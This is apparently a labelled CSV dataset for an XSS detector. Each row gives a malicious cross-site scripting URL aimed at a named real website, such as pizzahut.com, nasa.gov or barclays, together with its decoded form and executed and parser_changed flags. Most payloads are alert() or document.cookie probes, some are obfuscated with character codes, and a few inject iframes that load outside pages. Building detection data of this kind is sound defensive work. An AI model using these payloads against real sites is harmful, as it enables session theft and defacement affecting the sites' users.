Payloads,Class,decoded,executed,parser_changed
http://www.betechseals.dk/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br>rt(&quot;818&quot;)&lt;/script&gt;,Malicious,"http://www.betechseals.dk/irj/portal/anonymous?guest_user=><script>alert(""818"")</script>><script>alert(""818"")</script>",True,True
http://z0ne-h.net/oyla.asp?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,Malicious,"http://z0ne-h.net/oyla.asp?haber_id=""><script>alert(document.cookie)</script><h1>by st@rext</h1>",True,True
http://www.pizzahut.com/search/default.asp?qu=&gt;&gt;&lt;script&gt;alert(&quot;xss-arham+muhammad&quot;)&lt;/script&gt;&amp;action=<br>search,Malicious,"http://www.pizzahut.com/search/default.asp?qu=>><script>alert(""xss-arham muhammad"")</script>&action=search",True,True
http://cfp-ca.org/search_results.asp?target=standards%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c<br>/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://cfp-ca.org/search_results.asp?target=standards'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
http://www.colbertnation.com/video?keywords=&lt;/title&gt;&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,Malicious,"http://www.colbertnation.com/video?keywords=</title>""><script>alert(1);</script>",True,True
"http://481792.myshoutbox.com/?f=d&amp;mid=1189650867&amp;lang=us&amp;css=xss&amp;extcss=%22%3e%3cimg%20src=!%20onerr<br>or=alert(string.fromcharcode(88,115,115,101,100,32,98,121,32,66,97,98,97,99,111,110,100,97,32,61,41)<br>)%3e%3c/img%3e",Malicious,"http://481792.myshoutbox.com/?f=d&mid=1189650867&lang=us&css=xss&extcss=""><img src=! onerror=alert(string.fromcharcode(88,115,115,101,100,32,98,121,32,66,97,98,97,99,111,110,100,97,32,61,41))></img>",True,True
http://adsl.superonline.com/detail.php?id=1'&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://adsl.superonline.com/detail.php?id=1'""><script>alert(document.cookie)</script>",True,True
http://www.forbes.com/?partner=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.forbes.com/?partner=""><script>alert(""maxwel"")</script>",True,True
http://www.2stenar.se/search.asp?searchfor=&quot;&lt;/script&gt;&lt;script&gt;alert(&quot;hacked : )&quot;)&lt;/script&gt;,Malicious,"http://www.2stenar.se/search.asp?searchfor=""</script><script>alert(""hacked : )"")</script>",True,True
http://www.mad.tv/search/index.php?searchwords=&lt;script&gt;alert('dont get mad!')&lt;/script&gt;,Malicious,http://www.mad.tv/search/index.php?searchwords=<script>alert('dont get mad!')</script>,True,True
http://www.eurofootball.lt/index.php?lpage=search&amp;page=search&amp;s=%22%3e%3cscript%3ealert(7);%3c/scrip<br>t%3e,Malicious,"http://www.eurofootball.lt/index.php?lpage=search&page=search&s=""><script>alert(7);</script>",True,True
http://ms125.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious,"http://ms125.mysearch.com/search/ggweb.jhtml?searchfor=""><script>alert(""maxwel"")</script>",True,True
http://www.worth1000.com/default.asp?display=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.worth1000.com/default.asp?display=""><script>alert(""maxwel"")</script>",True,True
http://llis.nasa.gov/nasasearch/llis/browse/browse.jsp?browsepath=root~topics&amp;nasainclude=%22%3e%3cs<br>cript%3ealert%28%22xss%20balckboy1337%22%29%3c/script%3e&amp;descend=true,Malicious,"http://llis.nasa.gov/nasasearch/llis/browse/browse.jsp?browsepath=root~topics&nasainclude=""><script>alert(""xss balckboy1337"")</script>&descend=true",True,True
http://www.vodafone.com.tr:80/arama.php?q=&lt;script%20%0a%0d&gt;alert(38205827)%3b&lt;/script&gt;,Malicious,"http://www.vodafone.com.tr:80/arama.php?q=<script 
>alert(38205827);</script>",True,True
http://www.landing.rewardzonemastercard.com/media/disclosure?cmd_lpage=&amp;indicator=rz002&amp;media=b1ag03<br>0aa_t97}&quot;&gt;&lt;script&gt;alert(&quot;test&quot;)&lt;/script&gt;,Malicious,"http://www.landing.rewardzonemastercard.com/media/disclosure?cmd_lpage=&indicator=rz002&media=b1ag030aa_t97}""><script>alert(""test"")</script>",True,True
http://www.bernieloehn.de/webcards/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;,Malicious,"http://www.bernieloehn.de/webcards/tools/calendar.php?month=""><script>alert(document.cookie)</script>",True,True
http://www.xzqh.cn/otype.asp?owen1=%3cscript%3ealert(%22xss%22)%3c/script%3e&amp;owen2=%d0%d0%d5%fe%c7%f<br>8%bb%ae%b5%f7%d5%fb%b9%ab%b8%e6,Malicious,"http://www.xzqh.cn/otype.asp?owen1=<script>alert(""xss"")</script>&owen2=����������������",True,True
http://imdb.com/searchall?&quot;&gt;&lt;script&gt;alert(/www.r3t.n3t.nl/)&lt;/script&gt;,Malicious,"http://imdb.com/searchall?""><script>alert(/www.r3t.n3t.nl/)</script>",True,True
http://robotics.nasa.gov/archive/robot_news.php?year=2005&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://robotics.nasa.gov/archive/robot_news.php?year=2005<script>alert(document.cookie);</script>,True,True
http://ask.barclays.co.uk/branchfinder?site=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious,"http://ask.barclays.co.uk/branchfinder?site=""><script>alert('xss')</script>",True,True
http://whois.ws/domain_suggestions.php?current_name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://whois.ws/domain_suggestions.php?current_name=""><script>alert(document.cookie)</script>",True,True
http://www.phanos.org/index.php?item=--%3e%3cscript%3ealert%28123%29%3c/script%3e,Malicious,http://www.phanos.org/index.php?item=--><script>alert(123)</script>,True,True
http://www.mindat.org/rloc.php?loc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.mindat.org/rloc.php?loc=""><script>alert(""maxwel"")</script>",True,True
http://www.eniro.se/query?hpp=&amp;ax=&amp;search_word=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://www.eniro.se/query?hpp=&ax=&search_word=""><script>alert(1)</script>",True,True
http://www.buydomains.com/find-premium-domains/index.jsp?no_results=true&amp;keywords=%22%3e%3cscript%3e<br>alert(document.cookie)%3c/script%3e,Malicious,"http://www.buydomains.com/find-premium-domains/index.jsp?no_results=true&keywords=""><script>alert(document.cookie)</script>",True,True
http://benq.gr/press/news.cfm?id=1882&amp;cat=2&amp;year=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+nar<br>coticxs&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://benq.gr/press/news.cfm?id=1882&cat=2&year=""><script>alert('xss')</script>><marquee><h1>by narcoticxs</h1></marquee>",True,True
http://22.911-job.ru/az.php?zc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://22.911-job.ru/az.php?zc=""><script>alert(""maxwel"")</script>",True,True
http://www.dailymotion.com/login?restricted_action=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;,Malicious,"http://www.dailymotion.com/login?restricted_action=""><script>alert('trex')</script>",True,True
http://www.microsave.org/french/relateddownloads.asp?id=22&amp;cat_id=256&amp;title=&lt;script&gt;alert(&quot;scriptori<br>um(turkey)&quot;)&lt;/script&gt;,Malicious,"http://www.microsave.org/french/relateddownloads.asp?id=22&cat_id=256&title=<script>alert(""scriptorium(turkey)"")</script>",True,True
http://shop.nationalgeographic.com/subscribemain.jsp?email=%22%3e%3cscript%3ealert%281%29%3c%2fscrip<br>t%3e&amp;submit2.x=25&amp;submit2.y=15&amp;submit2=submit,Malicious,"http://shop.nationalgeographic.com/subscribemain.jsp?email=""><script>alert(1)</script>&submit2.x=25&submit2.y=15&submit2=submit",True,True
http://www.anre.ro/rezultatul_cautarii.php?valid_sea=1&amp;key=%22%3e%3cscript%3ealert%28%2fxss+%23+re-s<br>ecurity.ro%2f%29%3c%2fscript%3e&amp;restrictie=tot,Malicious,"http://www.anre.ro/rezultatul_cautarii.php?valid_sea=1&key=""><script>alert(/xss # re-security.ro/)</script>&restrictie=tot",True,True
http://www.utusan.com.my/utusan/keyword_search.asp?newstring=%22%3e%3cscript%3ealert%28document.title=%22centrinel%20was%20here%22%29%3c/script%3e%3ciframe%20src=%22http://xssed.com%22%3e,Malicious,"http://www.utusan.com.my/utusan/keyword_search.asp?newstring=""><script>alert(document.title=""centrinel was here"")</script><iframe src=""http://xssed.com"">",True,True
http://www.educacion.buenosaires.gov.ar/avisos/?menu_id=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious,"http://www.educacion.buenosaires.gov.ar/avisos/?menu_id=""><script>alert(/xss/)</script>",True,True
http://www.freebsd.org/cgi/ports.cgi?query=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e&amp;stype=all&amp;sektion=all,Malicious,"http://www.freebsd.org/cgi/ports.cgi?query='""></title><script>alert(1337)</script>><marquee><h1>xss by xylitol</h1></marquee>&stype=all&sektion=all",True,True
http://www.motour.gov.my/installation_prior/phpinfo.php?a[]=%3cscript%3ealert(/xssed_by_omeha/);%3c/<br>script%3e%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious,http://www.motour.gov.my/installation_prior/phpinfo.php?a[]=<script>alert(/xssed_by_omeha/);</script><script>alert(document.cookie);</script>,True,True
http://www.hazarkor.co.il/search.php?q=%3cscript%3ealert(document.cookie)%3c/script%3e&amp;x=0&amp;y=0,Malicious,http://www.hazarkor.co.il/search.php?q=<script>alert(document.cookie)</script>&x=0&y=0,True,True
http://news.giggog.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,"http://news.giggog.com/search.php?keyword=""><script>alert(document.cookie);</script>",True,True
http://aikido-nuernberg.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;bac<br>kdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://aikido-nuernberg.de/index.php?page=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://oktayd.web.cern.ch/oktayd/ozgecmis.php?dil=etr&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious,"http://oktayd.web.cern.ch/oktayd/ozgecmis.php?dil=etr""><script>alert(document.cookie)</script>",True,True
http://www.mods.dk/index.php?modelid=549&amp;radiorec=motorola%22%3e%3cscript%3ealert(/ccc/)%3c/script%3<br>e,Malicious,"http://www.mods.dk/index.php?modelid=549&radiorec=motorola""><script>alert(/ccc/)</script>",True,True
http://www.lilke.de/test.php?a[]=%3cscript%3ealert(/xss/);%3c/script%3e,Malicious,http://www.lilke.de/test.php?a[]=<script>alert(/xss/);</script>,True,True
http://www.veth.gov.gr/c/portal_public/layout?p_l_id=1.1&amp;p_p_id=latest_news&amp;p_p_action=1&amp;p_p_state=m<br>aximized&amp;p_p_mode=%22%3e%3cscript%3ealert(document.domain)%3c/script%3e&amp;_latest_news_struts_action=%<br>2fext%2fmy%2fnews%2fview_new&amp;_latest_news_struts_action=%2fext%2fmy%2fnews%2fview_news&amp;_latest_news_<br>new_id=400&amp;_latest_news_p_p_text=news,Malicious,"http://www.veth.gov.gr/c/portal_public/layout?p_l_id=1.1&p_p_id=latest_news&p_p_action=1&p_p_state=maximized&p_p_mode=""><script>alert(document.domain)</script>&_latest_news_struts_action=/ext/my/news/view_new&_latest_news_struts_action=/ext/my/news/view_news&_latest_news_new_id=400&_latest_news_p_p_text=news",True,True
http://gis.cstone.idv.tw/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://gis.cstone.idv.tw/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://www.yemliha.bel.tr/default.asp?say=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://www.yemliha.bel.tr/default.asp?say=""><script>alert(""backdoor"")</script>",True,True
http://www.ec.gc.ca/ceparegistry/participation/archives/default.cfm?intyear=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;<br>)&lt;/script&gt;,Malicious,"http://www.ec.gc.ca/ceparegistry/participation/archives/default.cfm?intyear=""><script>alert(""maxwel"")</script>",True,True
http://www.ghlhoteles.com/hotel.php3?id=%3e%3cscript%3ealert('xss')%3c/script%3e%3e%3cmarquee%3e%3ch<br>1%3eby+ivan_sanchez%20-%20exploiting%20sql%20injection%20!!!%3c/h1%3e%3c/marquee%3e,Malicious,http://www.ghlhoteles.com/hotel.php3?id=><script>alert('xss')</script>><marquee><h1>by ivan_sanchez - exploiting sql injection !!!</h1></marquee>,True,True
http://www.wareztunisie.org/torrent/torrents.php?parent_cat=%3cscript%20%0a%0d%3ealert(/k3vinmitnick<br>/)%3b%3c/script%3e&amp;page=1,Malicious,"http://www.wareztunisie.org/torrent/torrents.php?parent_cat=<script 
>alert(/k3vinmitnick/);</script>&page=1",True,True
http://lankskafferiet.skolutveckling.se/cgi-bin/search.cgi?mode=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://lankskafferiet.skolutveckling.se/cgi-bin/search.cgi?mode=""><script>alert(""maxwel"")</script>",True,True
http://www.programas-gratis.net/php/buscador1.php?buscar=%3e%22%3e%3cscript%3ealert('norehem%20was%2<br>0here!!')%3c/script%3e%3ch1%3e%3ch1%3e%3ch1%3e%3cmarquee%3enorehem%20was%20here%3c/marquee%3e%3c/h1%<br>3e%3c/h1%3e%3c/h1%3e%3ccenter%3e%3cimg%20src=%22http://www.cibernautica.com/forocibernautica/upload/<br>norehemzu4.gif%22%3e%3c/center%3e%3ciframe%20src=http://jersain.iespana.es/xss.html%20%3c,Malicious,"http://www.programas-gratis.net/php/buscador1.php?buscar=>""><script>alert('norehem was here!!')</script><h1><h1><h1><marquee>norehem was here</marquee></h1></h1></h1><center><img src=""http://www.cibernautica.com/forocibernautica/upload/norehemzu4.gif""></center><iframe src=http://jersain.iespana.es/xss.html <",True,True
http://www.chemsafety.gov/email_page/index.cfm?link=&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,http://www.chemsafety.gov/email_page/index.cfm?link=<script>alert(123)</script>,True,True
http://help.travian3.pl/index.php?type=faq&amp;mod=%22%3e%3cscript%3ealert%28%2fxss+by+redtuning%2f%29%3<br>b%3c%2fscript%3e,Malicious,"http://help.travian3.pl/index.php?type=faq&mod=""><script>alert(/xss by redtuning/);</script>",True,True
http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_signup.asp?page=&quot;&gt;&lt;script&gt;alert<br>(document.cookie)&lt;/script&gt;&lt;h1&gt;st@rext&lt;/h1&gt;,Malicious,"http://www.okuluygulamalari.net/okuluygulamalari.net/forum/philboard_signup.asp?page=""><script>alert(document.cookie)</script><h1>st@rext</h1>",True,True
http://www2.itapemirim.com.br/fidelidade/itapemirim/login.asp?referer=resgate.asp&amp;title=&lt;script&gt;aler<br>t(&quot;scriptorium(turkey)&quot;)&lt;/script&gt;,Malicious,"http://www2.itapemirim.com.br/fidelidade/itapemirim/login.asp?referer=resgate.asp&title=<script>alert(""scriptorium(turkey)"")</script>",True,True
http://www.plextor.be/technicalservices/all/downloads.asp?choice=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.plextor.be/technicalservices/all/downloads.asp?choice=""><script>alert(""maxwel"")</script>",True,True
http://www.sunderland.gov.uk/pages/search/search.asp?action=new+query&amp;searchstring=&quot;&gt;&lt;script&gt;alert(&quot;<br>x&quot;);&lt;/script&gt;,Malicious,"http://www.sunderland.gov.uk/pages/search/search.asp?action=new query&searchstring=""><script>alert(""x"");</script>",True,True
http://maxim.resultspage.com/search?sessid=6c623b3a37172bc2b3fa7c3902703290&amp;w=%22%3e%3c%2ftitle%3e%3<br>c%2fscript%3e%3cscript%3ealert%281%29%3c%2fscript%3e+%22onmouseover%3d%22alert%281%29%22+onmouseover<br>%3dalert%281%29&amp;x=16&amp;y=9,Malicious,"http://maxim.resultspage.com/search?sessid=6c623b3a37172bc2b3fa7c3902703290&w=""></title></script><script>alert(1)</script> ""onmouseover=""alert(1)"" onmouseover=alert(1)&x=16&y=9",True,True
http://www.auschwitz.org.pl/new/index.php?language=wawa'&gt;&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,http://www.auschwitz.org.pl/new/index.php?language=wawa'><script>alert(123)</script>,True,True
http://spor.ekolay.net/futbol/lig.asp?pid=2663dsa&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,Malicious,"http://spor.ekolay.net/futbol/lig.asp?pid=2663dsa""><script>alert(1)</script>",True,True
http://www.lexi.com/web/news.jsp?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://www.lexi.com/web/news.jsp?id=""><script>alert(""maxwel"")</script>",True,True
http://www.kleenagel.com/guest/index.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,Malicious,"http://www.kleenagel.com/guest/index.php?lang=""><script>alert(document.cookie)</script>><marquee><h1>backdoor</h1></marquee>",True,True
http://www.intouchparenting.co.za/index.php?id=%22%3e%3cscript%3ealert%28document.cookie%29%3c/scrip<br>t%3e,Malicious,"http://www.intouchparenting.co.za/index.php?id=""><script>alert(document.cookie)</script>",True,True
http://search.aimpages.com/apsearchus/gallerysearch?query=%3cscript%3ealert('i-landet')%3c/script%3e,Malicious,http://search.aimpages.com/apsearchus/gallerysearch?query=<script>alert('i-landet')</script>,True,True
http://www2.worldlingo.com/switch_language_all.html?u=%22%3e&lt;script&gt;alert(123)&lt;/script&gt;,Malicious,"http://www2.worldlingo.com/switch_language_all.html?u=""><script>alert(123)</script>",True,True
http://erbaahaber.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,Malicious,"http://erbaahaber.com/search.asp?mtd=1&strkey=""><script>alert(""backdoor"")</script>",True,True
http://www.bennadel.com/index.cfm?dax=--&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,Malicious,http://www.bennadel.com/index.cfm?dax=--><script>alert(document.cookie);</script>,True,True
http://www.smfcorp.net/articles/article.php?id=%27%22%3e%3c/title%3e%3cscript%3ealert%281337%29%3c/s<br>cript%3e,Malicious,"http://www.smfcorp.net/articles/article.php?id='""></title><script>alert(1337)</script>",True,True
http://portal.acm.org/dl.cfm?coll=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious,"http://portal.acm.org/dl.cfm?coll=""><script>alert(""maxwel"")</script>",True,True
<img id=xss src=javascript:alert(&quot;xss&quot;)>,Malicious,"<img id=xss src=javascript:alert(""xss"")>",True,True
http://ejang.net/blog/tt/index.php?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%<br>70%74%3e%61%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%3<br>2%31%2c%33%32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c<br>%31%31%31%2c%34%36%2c%39%39%2c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1,Malicious,"http://ejang.net/blog/tt/index.php?action=index&setdate=200703&setday=21"">'><script>alert(String.fromCharCode(66,121,32,107,117,115,111,109,105,115,111,46,99,111,109))</script>
&page=1",True,True
http://notrefamille.femmes.fr.msn.com/v2/boutique/vie-privee.asp?theme=%22%3e%3cscript%3ealert('by<br>encore')%3c/script%3e,Malicious,"http://notrefamille.femmes.fr.msn.com/v2/boutique/vie-privee.asp?theme=""><script>alert('byencore')</script>",True,True
http://www.waramps.ca/military/%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%27%22%3e%3c<br>marquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,Malicious,"http://www.waramps.ca/military/'""></title><script>alert(1337)</script>'""><marquee><h1>xss by xylitol</h1></marquee>",True,True
